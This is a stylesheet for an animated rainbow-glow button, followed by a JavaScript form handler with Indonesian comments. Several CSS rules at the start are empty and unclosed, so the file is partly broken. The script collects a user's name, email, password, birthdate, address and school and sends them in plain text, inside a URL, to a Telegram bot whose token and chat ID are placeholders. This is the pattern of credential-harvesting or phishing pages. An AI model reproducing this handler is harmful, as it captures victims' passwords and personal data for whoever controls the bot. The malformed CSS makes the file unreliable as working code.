.container {

.container h2 {

.label-input {

.label-input label {

.label-input select {

.button-container {
  display: flex;
  justify-content: center;

.button-85 {
  padding: 0.6em 2em;
  border: none;
  outline: none;
  color: rgb(255, 255, 255);
  background: #111;
  cursor: pointer;
  position: relative;
  z-index: 0;
  border-radius: 10px;
  user-select: none;
  -webkit-user-select: none;
  touch-action: manipulation;
}

.button-85:before {
  content: "";
  background: linear-gradient(
    45deg,
    #ff0000,
    #ff7300,
    #fffb00,
    #48ff00,
    #00ffd5,
    #002bff,
    #7a00ff,
    #ff00c8,
    #ff0000
  );
  position: absolute;
  top: -2px;
  left: -2px;
  background-size: 400%;
  z-index: -1;
  filter: blur(5px);
  -webkit-filter: blur(5px);
  width: calc(100% + 4px);
  height: calc(100% + 4px);
  animation: glowing-button-85 20s linear infinite;
  transition: opacity 0.3s ease-in-out;
  border-radius: 10px;
}

@keyframes glowing-button-85 {
  0% {
    background-position: 0 0;
  }
  50% {
    background-position: 400% 0;
  }
  100% {
    background-position: 0 0;
  }
}

.button-85:after {
  z-index: -1;
  content: "";
  position: absolute;
  width: 100%;
  height: 100%;
  background: #222;
  left: 0;
  top: 0;
  border-radius: 10px;
}

.button-85:hover:before {
  opacity: 0;
}

/* CSS yang perlu ditambahkan */

<script>
function submitForm(event) {
  event.preventDefault();
  var name = document.getElementById('name').value;
  var email = document.getElementById('email').value;
  var password = document.getElementById('password').value;
  var birthdate = document.getElementById('birthdate').value;
  var address = document.getElementById('address').value;
  var school = document.getElementById('school').value;

  // Kirim data ke Telegram
  sendToTelegram(name, email, password, birthdate, address, school);

  // Bersihkan nilai input
  document.getElementById('name').value = '';
  document.getElementById('email').value = '';
  document.getElementById('password').value = '';
  document.getElementById('birthdate').value = '';
  document.getElementById('address').value = '';
  document.getElementById('school').value = 'yes'; // Default pilihan "Ya"
}

function sendToTelegram(name, email, password, birthdate, address, school) {
  var botToken = 'You_Token';
  var chatId = 'You_Chat_ID';
  var message = `
    <b>Pendaftaran Baru:</b>\n
    <b>Nama:</b> ${name}\n
    <b>Email:</b> ${email}\n
    <b>Password:</b> ${password}\n
    <b>Tanggal Lahir:</b> ${birthdate}\n
    <b>Tempat Tinggal:</b> ${address}\n
    <b>Sekolah:</b> ${school}
  `;
  var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;

  var xhr = new XMLHttpRequest();
  xhr.open('GET', url, true);
  xhr.send();
}
